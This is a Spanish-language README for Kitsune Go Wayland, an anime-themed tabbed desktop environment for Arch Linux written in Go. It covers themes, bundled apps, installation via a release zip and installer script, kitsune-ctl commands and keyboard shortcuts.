# 🦊 Kitsune Go Wayland `v2.0.1` — Escritorio Anime Tabbed Puro en Go para Arch Linux

**Kitsune Go Wayland** (`v2.0.1`) es un entorno de escritorio independiente para **Wayland** en **Arch Linux**, desarrollado íntegramente en **Go** (`0` dependencias externas en Go y binario único con `//go:embed`), **sin Sway, sin SwayFX, sin Hyprland y sin Dock inferior**.

Está diseñado alrededor de un flujo de trabajo limpio en **modo `Tabbed` (por pestañas)** a pantalla completa, con **barra superior estilo Waybar** con *workspaces* kanji (`一 二 三 四 五`), lanzador **Rofi**, **bordes luminosos** y **desenfoque *blur* ajustables en vivo**.

---

## ✨ Aplicaciones Integradas yCaracterísticas Principales

- **🗂️ Escritorio `Tabbed` de Altura Completa (Sin Dock Inferior)**:
  - Todas tus aplicaciones se organizan en una barra de pestañas cristalina bajo la barra superior (`Alt + Tab` o clic directo), aprovechando el 100% del alto de la pantalla sin ningún dock abajo.
  - También puedes alternar en vivo a `Tiling`, `Flotante` o `Monocle` (`Alt + T`).
- **🧭 Barra Superior Estilo Waybar + Lanzador Rofi**:
  - Espacios de trabajo kanji (`一 二 三 四 五`), disparador **Rofi** (`Alt + Space`), radio sintetizador Lo-Fi, reloj, selector de tema en 1 clic, telemetría CPU/RAM en tiempo real, centro de notificaciones y pantalla de bloqueo Anime (`Alt + L`).
- **💧 Bordes Luminosos y *Blur* Ajustables en Vivo**:
  - Deslizadores en tiempo real para **Intensidad de Cristal Blur (`0px` – `36px`)**, **Brillo de Bordes Luminosos (`0%` – `100%`)**, grosor de borde, redondeo de esquinas y opacidad.
- **🛠️ Suite de 4 Aplicaciones Principales Incluidas**:
  1. **🎨 Kitsune Rice Studio**: Selector de temas Anime, ajuste en vivo de *blur* y bordes luminosos, y exportador de configuraciones.
  2. **📊 Btop++ Monitor**: Gráfica histórica de CPU en vivo (`<canvas>`), barras por núcleo, memoria RAM, disco, red y tabla real de procesos Linux (`/proc`).
  3. **📁 Yazi File Manager**: Gestor de archivos de doble panel con vista previa instantánea de código e imágenes e integración directa con Neovim.
  4. **📝 Neovim Go Studio**: Editor modal (`NORMAL` / `INSERT`) con pestañas rápidas del proyecto Go, numeración de líneas, guardado real en disco (`:w` / `Ctrl+S`) y ejecución de `go test ./...`.

---

## 🌸 Todos los Temas Anime Incluidos

- **`neon-tokyo`** (*Cyberpunk Neon Tokyo* — `ネオ東京 // 2099`): Lluvia nocturna neón cian y magenta.
- **`sakura-lofi`** (*Sakura Catppuccin* — `桜ローファイ // 宵`): Pétalos de cerezo animados y paleta Catppuccin Mocha.
- **`crimson-shonen`** (*Crimson Shonen* — `紅蓮の刃 // 月蝕`): Negro obsidiana, luna carmesí y brasas flotantes.
- **`eva-midnight`** (*Midnight Evangelion* — `第3新東京市 // NERV`): Verde ácido EVA-01, ámbar táctico y violeta oscuro.

---

## 🚀 Descarga e Instalación en Arch Linux (`v2.0.1`)

```bash
curl -fLO https://github.com/ShadowNigth/Jonatan-1999/raw/v2.0.1/release/kitsune-go-wayland-arch-linux.zip
unzip -o kitsune-go-wayland-arch-linux.zip
cd kitsune-go-wayland-arch-linux
chmod +x INSTALAR_EN_ARCH.sh

# Instala dependencias Wayland (cage, weston, chromium, dbus, polkit, mesa) y repara permisos:
./INSTALAR_EN_ARCH.sh --theme neon-tokyo
```

En tu gestor de inicio de sesión (**SDDM, GDM, LightDM, greetd**) selecciona **`Kitsune Go (Wayland)`** (o **`Kitsune Go (X11)`** si usas drivers propietarios NVIDIA sin `nvidia_drm.modeset=1`). Cualquier registro de arranque queda guardado automáticamente en `~/.cache/kitsune-session.log`.

---

## 🛠️ Control en Vivo con `kitsune-ctl`

```bash
# Cambiar tema Anime en vivo
kitsune-ctl theme next
kitsune-ctl theme set sakura-lofi

# Ajustar desenfoque Blur (0..36px) y Bordes Luminosos (0..100%) en vivo
kitsune-ctl blur 24
kitsune-ctl glow 88

# Abrir aplicaciones en pestañas del modo Tabbed
kitsune-ctl open settings   # Kitsune Rice Studio
kitsune-ctl open sysmon     # Btop++ Monitor
kitsune-ctl open files      # Yazi File Manager
kitsune-ctl open nvim       # Neovim Go Studio

# Exportar configuraciones de Kitsune Go Wayland, Btop++, Yazi, Neovim y Kitty
kitsune-ctl export --theme neon-tokyo --out ~/.config
```

---

## ⌨️ Atajos de Teclado

| Atajo | Acción |
| :--- | :--- |
| `Alt + Space` | Abrir lanzador **Rofi** |
| `Alt + Tab` | Cambiar a la siguiente pestaña abierta (**Modo Tabbed**) |
| `Alt + Enter` | Nueva pestaña de **Kitty Terminal** |
| `Alt + W` | Activar modo **Tabbed** |
| `Alt + T` | Alternar entre `Tabbed`, `Tiling`, `Flotante` y `Monocle` |
| `Alt + V` | Desacoplar / acoplar ventana flotante |
| `Alt + Q` | Cerrar pestaña / ventana activa |
| `Alt + 1..5` | Cambiar entre *workspaces* kanji `一 二 三 四 五` |
| `Alt + L` | Bloquear pantalla Anime |
